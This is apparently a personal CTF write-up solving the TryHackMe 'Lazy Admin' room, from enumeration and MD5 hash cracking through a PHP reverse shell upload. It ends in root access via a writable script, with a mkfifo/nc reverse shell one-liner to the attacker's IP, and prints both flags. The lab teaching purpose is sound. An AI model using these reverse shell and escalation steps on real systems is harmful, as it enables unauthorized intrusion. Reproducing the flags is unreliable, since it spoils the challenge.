---
title: "[CTF] Tryhackme - Lazy Admin "
date: 2024-10-20 12:00:00 -500 
categories: [CTF - Tryhackme, Lazy Admin]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Lazy Admin ](https://tryhackme.com/r/room/lazyadmin)

## Tasks

- What is the user flag?
- What is the root flag?

        Have some fun! There might be multiple ways to get user access.


### What is the user flag?


The good thing is, we have several options to solve those tasks! 



First we scan our target with `nmap` to gain some informations about services and open ports. 

`nmap -sC -sV $ip`


```bash
└─$ nmap -sV -sC $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 17:16 CST
Nmap scan report for 10.10.137.66
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds

```


We have open ports for: `ssh` and `http`.

Lets check the website a bite more in depth:

- no `robots.txt` entry
- nothing to click just default webserver 
- nothing suspicious in source code


Okay lets run `nikto` and `gobuster` to see if there are some hidden paths.

`nikto -h $ip`

```bash
┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/lazyadmin]
└─$ nikto -h $ip
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.137.66
+ Target Hostname:    10.10.137.66
+ Target Port:        80
+ Start Time:         2024-10-26 17:18:30 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59878d86c765e, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8074 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-10-26 17:51:27 (GMT8) (1977 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Okay there are some informations but lets check other things. Lets try `gobuster`:

```bash

└─$ gobuster -w ~/Downloads/common.txt dir -u 10.10.137.66
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.66
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/admin/Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 314] [--> http://10.10.137.66/content/]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================

``` 

We check the path `content`:

```html
└─$ curl http://10.10.137.66/content/
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0" name="viewport" id="viewport"/><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><title>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</title>
<title>SweetRice notice</title>
<script type="text/javascript" src="http://10.10.137.66/content/js/SweetRice.js"></script>
<style>
*{margin:0;}
body{font-family:"Microsoft YaHei",Verdana,Georgia,arial,sans-serif;}
.header{line-height:30px;font-size:20px;background-color:#444;box-shadow:0px 0px 2px 2px #444;color:#fafafa;padding:0px 10px;}
#div_foot{      background-color:#444;height:30px;      line-height:30px;       color:#fff;padding:0px 10px;}
#div_foot a{    color: #66CC00; text-decoration: none;}
#div_foot a:hover{      color: #66CC00; text-decoration: underline;}
.content{margin:0px 10px;}
.content h1{
        margin:20px 0px;
        font-size:22px;
}
.content div,.content p{margin-bottom:16px;}
</style>
</head>
<body>
<div class="header">SweetRice notice</div>
<div class="content">
<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox "Site close" to open your website.</p><p>More help at <a href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/">Tip for Basic CMS SweetRice installed</a></p></div>
<div id="div_foot">Powered by <a href="http://www.basic-cms.org">Basic-CMS.ORG</a> SweetRice.</div>
<script type="text/javascript">
<!--
        _().ready(function(){
                _('.content').css({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
        });
        _(window).bind('resize',function(){
                _('.content').animate({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
        });
//-->
</script>
</body>
</html>
```

Okay we know the webpage uses `SweetRice` as webpage manager which is a very useful information. Unfortunately I didnt find a login page so far. We try to use `gobuster` for the path with `/content`

```bash

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/lazyadmin]
└─$ gobuster -w ~/Downloads/common.txt dir -u 10.10.137.66/content
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.66/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/admin/Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> http://10.10.137.66/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.137.66/content/inc/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.137.66/content/js/]
Progress: 1942 / 1943 (99.95%)

```

After checking the paths, the path `inc` is very exciting. There are a lot of files there, also a `mysql backup file` which I downloaded.

Interesting part about the file:
```sql

 14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',
```

In those lines there is a hashed `password`for the user `manager`.

    s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";


Lets check what kind of `hash` we got here and try to crack it
I use `hash_id` via `Python`:

```bash
┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/lazyadmin]
└─$ python3 ~/Desktop/thm/hash-id.py
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 42f749ade7f9e195bf475f37a44cafcb

Possible Hashs:
[+] MD5

```

Okay `MD5`, lets try it with `rockyou.txt` and `john`:

```bash 

┌──(admin㉿PREDATOR-01)-[~/Desktop/thm/lazyadmin]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt manager_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=24
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)
1g 0:00:00:00 DONE (2024-10-26 18:08) 50.00g/s 1689Kp/s 1689Kc/s 1689KC/s coco21..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.

```


After using a bigger `wordlist` I found the `login-page`:

```bash

└─$ gobuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt dir -u 10.10.137.66/content -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.66/content
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> http://10.10.137.66/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.137.66/content/js/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.137.66/content/inc/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.137.66/content/as/]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.137.66/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.137.66/content/attachment/]
Progress: 58480 / 87665 (66.71%)

```

The login page is `/as`.

Lets try our user `manager` with the `pwd` we got from `john`.


And we are logged in!! Lets find a way for break into the server. After browsing a bit, I found a way to upload files on the server. Thats perfect for a `php reverse shell`.

You get the script here:

[PHP-Reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

We set our ip into the script and the port `4444`


![lazyadmin](assets/img/tryhackme/lazyadmin/lazyadmin-01.png "lazyadmin")



I had to use the extension `php5`, because it seems that `php` is forbidden.


And of course we need to listen on our device with `nc`:

```bash

└─$ nc -nlvp 4444 10.10.137.66
listening on [any] 4444 ...
connect to [10.11.110.106] from (UNKNOWN) [10.10.137.66] 52974
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 13:31:12 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
``` 

And we have a connection! Lets check the flag:

```bash

www-data@THM-Chal:/$ cd home
cd home
www-data@THM-Chal:/home$ ls
ls
itguy
www-data@THM-Chal:/home$ cd it
cd itguy/
www-data@THM-Chal:/home/itguy$ cd itguy
cd itguy
bash: cd: itguy: No such file or directory
www-data@THM-Chal:/home/itguy$ ls
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt
cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
www-data@THM-Chal:/home/itguy$

```


Answer: `THM{63e5bce9271952aad1113b6f1ac28a07}`


### What is the root flag? 

Now we need a way to escalate our privileages. First we check what the user is allowed to do with `sudo -l`:
``` bash

www-data@THM-Chal:/var/log$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/var/log$
```
Very interesting, we have `root` permissions for executing the `backup.pl` file via `perl`. Lets check the content of the `perl file`:
```bash
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Lets check the `copy.sh` which gets executed:

```bash
www-data@THM-Chal:/etc$ cat copy.sh
cat copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
Okay this is very cool, after analyzing the script, it does the following:

- It first cleans up and creates a named pipe.
- It then sets up a listening netcat connection that allows remote execution of shell commands.
- Any command executed in the shell is sent back to the attacking machine (192.168.0.190:5554), and the results are returned to the original terminal.


So we just have to change the `ip` address to ours, to get another `reverse shell`: 

``` bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.110.106 4445 >/tmp/f" > copy.sh
```

And we need to listen of course: 
```bash
└─$ nc -nlnp 4445 10.10.137.66
/bin/sh: 0: can't access tty; job control turned off
# 
```

We are connetected as `root`!!!! Lets get the `root flag`:
```bash

root@THM-Chal:/etc# cd /
cd /
root@THM-Chal:/# cd root
cd root
root@THM-Chal:~# ls
ls
root.txt
root@THM-Chal:~# cat root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
root@THM-Chal:~#
```

Answer: `THM{6637f41d0177b6f37cb20d775124699f}`


We solved this CTF :-) 




## Thoughts:

I think this CTF is very nice because you have really several options to solve it. We used the `easiest` way I think, but there were more possibilities to get access! It nice that you dont get big `hints` so you have to figure out your own way. I had `password` for the user very early but had no idea, where I can use it :-) 

What did we learn?
- using `nmap` for scan open ports and versions
- using `nikto` for scanning the page for vulnerabilities
- using `gobuster` for scanning directories
- using `john` for cracking a md5 hash
- using `php reverse shell` to get access to the server



